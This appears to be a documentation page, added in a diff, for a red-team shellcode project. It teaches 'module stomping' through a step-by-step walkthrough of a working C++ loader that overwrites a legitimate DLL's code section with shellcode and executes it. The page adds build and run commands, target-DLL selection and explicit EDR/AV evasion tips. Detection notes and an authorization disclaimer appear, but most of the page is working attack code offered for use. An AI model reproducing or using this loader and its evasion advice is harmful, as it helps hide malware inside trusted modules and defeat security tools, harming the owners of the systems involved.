@@ -1,0 +1,413 @@
+---
+title: Module Stomping
+description: Learn about the module stomping technique for executing shellcode
+---
+
+Module stomping is a technique for executing shellcode by overwriting the executable section of a legitimately loaded DLL. Stardust includes a reference implementation in `test/stomper.cc`.
+
+## What is Module Stomping?
+
+Module stomping is a shellcode execution technique that:
+
+1. Loads a legitimate DLL without resolving imports
+2. Finds the executable `.text` section
+3. Changes memory protection to writable
+4. Overwrites the section with shellcode
+5. Restores memory protection
+6. Executes the shellcode from the legitimate module's memory
+
+## Benefits
+
+### Memory Protection Evasion
+
+- Shellcode executes from a legitimate module's memory space
+- Module appears legitimate to memory scanners
+- Backed by a file on disk (appears less suspicious)
+
+### Execution Flow
+
+- No RWX memory allocation needed
+- Uses existing executable memory
+- Execution starts from a legitimate module's address space
+
+## Implementation Walkthrough
+
+Let's examine how `test/stomper.cc` implements module stomping.
+
+### 1. Load Target DLL
+
+Load the target DLL with `DONT_RESOLVE_DLL_REFERENCES` flag:
+
+```cpp test/stomper.cc
+if ( ! (( image_base = reinterpret_cast<uintptr_t>( 
+    LoadLibraryExA( "chakra.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES ) 
+))) ) {
+    printf( "[-] LoadLibraryA Failed: %ld\n", GetLastError() );
+    goto LEAVE;
+}
+
+printf( "[*] loaded \"chakra.dll\" @ %llx\n", image_base );
+```
+
+The `DONT_RESOLVE_DLL_REFERENCES` flag:
+- Maps the DLL into memory
+- Does NOT resolve imports
+- Does NOT call DllMain
+- Prevents dependency loading
+
+### 2. Find the .text Section
+
+Locate the executable code section:
+
+```cpp test/stomper.cc
+nt_header  = reinterpret_cast<PIMAGE_NT_HEADERS>( 
+    image_base + reinterpret_cast<PIMAGE_DOS_HEADER>( image_base )->e_lfanew 
+);
+sec_header = IMAGE_FIRST_SECTION( nt_header );
+
+for ( int i = 0; i < nt_header->FileHeader.NumberOfSections; i++ ) {
+    if ( strcmp( reinterpret_cast<char*>( sec_header[ i ].Name ), ".text" ) != 0 ) {
+        break;
+    }
+}
+```
+
+This code:
+1. Gets the NT headers from the DOS header
+2. Gets the first section header
+3. Iterates through sections looking for `.text`
+
+### 3. Calculate Addresses
+
+Calculate the entry point and section address:
+
+```cpp test/stomper.cc
+entry      = reinterpret_cast<ScEntry>( image_base + nt_header->OptionalHeader.AddressOfEntryPoint );
+image_base = image_base + sec_header->VirtualAddress;
+
+printf( "[*] target code section @ %llx [%ld bytes]\n", image_base, sec_header->SizeOfRawData );
+printf( "[*] entry point @ %p \n", entry );
+```
+
+Where:
+- `entry`: DLL entry point (where execution will start)
+- `image_base`: Address of the `.text` section
+- `sec_header->SizeOfRawData`: Size of the section
+
+### 4. Change Memory Protection
+
+Make the section writable:
+
+```cpp test/stomper.cc
+if ( ! VirtualProtect( 
+    reinterpret_cast<LPVOID>( image_base ), 
+    sec_header->SizeOfRawData, 
+    PAGE_READWRITE, 
+    reinterpret_cast<PDWORD>( &protection ) 
+) ) {
+    printf( "[-] VirtualProtect Failed: %ld\n", GetLastError() );
+    goto LEAVE;
+}
+```
+
+This:
+- Changes protection to `PAGE_READWRITE`
+- Stores old protection in `protection` variable
+- Covers the entire `.text` section
+
+### 5. Copy Shellcode
+
+Overwrite the section with shellcode:
+
+```cpp test/stomper.cc
+memcpy( reinterpret_cast<void*>( entry ), file_buffer, file_length );
+```
+
+The shellcode is copied to the entry point address, overwriting legitimate code.
+
+### 6. Restore Protection
+
+Restore original memory protection:
+
+```cpp test/stomper.cc
+if ( ! VirtualProtect( 
+    reinterpret_cast<LPVOID>( image_base ), 
+    sec_header->SizeOfRawData, 
+    protection, 
+    reinterpret_cast<PDWORD>( &protection ) 
+) ) {
+    printf( "[-] VirtualProtect Failed: %ld\n", GetLastError() );
+    goto LEAVE;
+}
+
+puts( "[*] wrote shellcode into target module" );
+```
+
+This restores the original protection (typically `PAGE_EXECUTE_READ`).
+
+### 7. Execute Shellcode
+
+Execute the shellcode:
+
+```cpp test/stomper.cc
+printf( "[*] press enter..." );
+getchar();
+
+entry( nullptr );
+```
+
+The `entry` function pointer now points to your shellcode!
+
+## Using the Stomper
+
+### Build the Stomper
+
+Compile both x64 and x86 versions:
+
+```bash
+make stomper
+```
+
+This creates:
+- `test/stomper.x64.exe` - 64-bit loader
+- `test/stomper.x86.exe` - 32-bit loader
+
+### Run Your Shellcode
+
+```bash
+# Build shellcode first
+make
+
+# Run x64 shellcode
+test/stomper.x64.exe bin/stardust.x64.bin
+
+# Run x86 shellcode
+test/stomper.x86.exe bin/stardust.x86.bin
+```
+
+### Example Output
+
+```
+[*] shellcode file @ 0x00007FF6A2B10000 [752 bytes]
+[*] loaded "chakra.dll" @ 7ff6a2b20000
+[*] target code section @ 7ff6a2b21000 [4096 bytes]
+[*] entry point @ 0x00007FF6A2B21580
+[*] wrote shellcode into target module
+[*] press enter...
+```
+
+## Choosing Target DLLs
+
+### Good Candidates
+
+Look for DLLs with:
+
+1. **Large .text sections**: More space for shellcode
+2. **Common presence**: Less suspicious
+3. **Minimal dependencies**: Faster loading with `DONT_RESOLVE_DLL_REFERENCES`
+
+Examples:
+```cpp
+LoadLibraryExA( "chakra.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES );
+LoadLibraryExA( "mscorlib.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES );
+LoadLibraryExA( "mfc42.dll", nullptr, DONT_RESOLVE_DLL_REFERENCES );
+```
+
+### Avoid
+
+1. System-critical DLLs (ntdll.dll, kernel32.dll)
+2. DLLs with extensive dependencies
+3. DLLs with strong code signing requirements
+
+## Advanced Techniques
+
+### Dynamic Target Selection
+
+Choose target DLL at runtime:
+
+```cpp
+const char* targets[] = {
+    "chakra.dll",
+    "mscorlib.dll",
+    "mfc42.dll",
+    nullptr
+};
+
+for ( int i = 0; targets[i]; i++ ) {
+    HMODULE hMod = LoadLibraryExA( targets[i], nullptr, DONT_RESOLVE_DLL_REFERENCES );
+    if ( hMod ) {
+        printf( "[*] Using target: %s\n", targets[i] );
+        // Proceed with stomping
+        break;
+    }
+}
+```
+
+### Section Size Validation
+
+Ensure the section is large enough:
+
+```cpp
+if ( sec_header->SizeOfRawData < file_length ) {
+    printf( "[-] Shellcode too large for section (%lu > %lu)\n", 
+        file_length, sec_header->SizeOfRawData );
+    goto LEAVE;
+}
+```
+
+### Finding Alternative Sections
+
+Look for other executable sections:
+
+```cpp
+for ( int i = 0; i < nt_header->FileHeader.NumberOfSections; i++ ) {
+    if ( sec_header[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
+        if ( sec_header[i].SizeOfRawData >= file_length ) {
+            printf( "[*] Found suitable section: %s\n", sec_header[i].Name );
+            // Use this section
+            break;
+        }
+    }
+}
+```
+
+### Clean Memory
+
+Zero out remaining section space:
+
+```cpp
+memcpy( reinterpret_cast<void*>( entry ), file_buffer, file_length );
+
+// Zero remaining space
+if ( sec_header->SizeOfRawData > file_length ) {
+    memset( 
+        reinterpret_cast<void*>( entry + file_length ), 
+        0, 
+        sec_header->SizeOfRawData - file_length 
+    );
+}
+```
+
+## File Reading
+
+The stomper includes a helper function to read shellcode:
+
+```cpp test/stomper.cc
+auto file_read(
+    _In_  const char* file_name,
+    _Out_ uint32_t&   file_size
+) -> uint8_t* {
+    HANDLE   file_handle = { nullptr };
+    uint8_t* file_buffer = { nullptr };
+
+    if ( (( file_handle = CreateFileA(
+        file_name,
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
+    ) ) == INVALID_HANDLE_VALUE ) ) {
+        printf( "[-] CreateFileW Failed: %lu\n", GetLastError() );
+        goto LEAVE;
+    }
+
+    if ( ! (( file_size = GetFileSize( file_handle, nullptr ) )) ) {
+        printf( "[-] CreateFileW Failed: %lu\n", GetLastError() );
+        goto LEAVE;
+    }
+
+    file_buffer = static_cast<uint8_t*>( malloc( file_size ) );
+    if ( !file_buffer ) {
+        printf( "[-] malloc failed: %lu\n", GetLastError() );
+        goto LEAVE;
+    }
+
+    if ( !ReadFile( file_handle, file_buffer, file_size, nullptr, nullptr ) ) {
+        printf( "[-] ReadFile failed: %lu\n", GetLastError() );
+        goto LEAVE;
+    }
+
+LEAVE:
+    if ( file_handle != INVALID_HANDLE_VALUE )
+    {
+        CloseHandle( file_handle );
+    }
+
+    return file_buffer;
+}
+```
+
+## Detection Considerations
+
+### EDR/AV May Detect
+
+1. **Suspicious API sequence**: LoadLibraryEx → VirtualProtect → memcpy → Execute
+2. **Memory modifications**: Changes to legitimate DLL code
+3. **Execution from modified memory**: Code doesn't match disk image
+4. **Behavioral patterns**: Entry point execution without DllMain
+
+### Evasion Techniques
+
+1. **Add delays**: Between stomping stages
+2. **Randomize targets**: Choose different DLLs each run
+3. **Indirect calls**: Use function pointers
+4. **Clean up**: Restore original code after execution
+
+## Troubleshooting
+
+### LoadLibraryEx Fails
+
+```
+[-] LoadLibraryA Failed: 126
+```
+
+Possible causes:
+- DLL not found in system directories
+- Architecture mismatch (x64 vs x86)
+- DLL requires dependencies
+
+Solution: Try a different target DLL
+
+### VirtualProtect Fails
+
+```
+[-] VirtualProtect Failed: 5
+```
+
+Causes:
+- Insufficient permissions
+- Protected process
+- Code integrity enforcement
+
+Solution: Run with administrator privileges
+
+### Shellcode Crashes
+
+1. Check architecture matches (x64 stomper with x64 shellcode)
+2. Verify shellcode is position-independent
+3. Enable debug build: `make debug`
+4. Check section is large enough
+
+### Section Not Found
+
+If `.text` section isn't found:
+- Target DLL may use different section name
+- Look for any executable section
+- Check section characteristics
+
+## Security Implications
+
+Module stomping is commonly used in:
+- Red team operations
+- Malware execution
+- AV/EDR evasion
+
+**Always use responsibly and only in authorized testing environments.**
+
+## Next Steps
+
+- [Creating Custom Shellcode](/guides/creating-shellcode)
+- [Adding New APIs](/guides/adding-apis)
+- [Debugging](/guides/debugging)
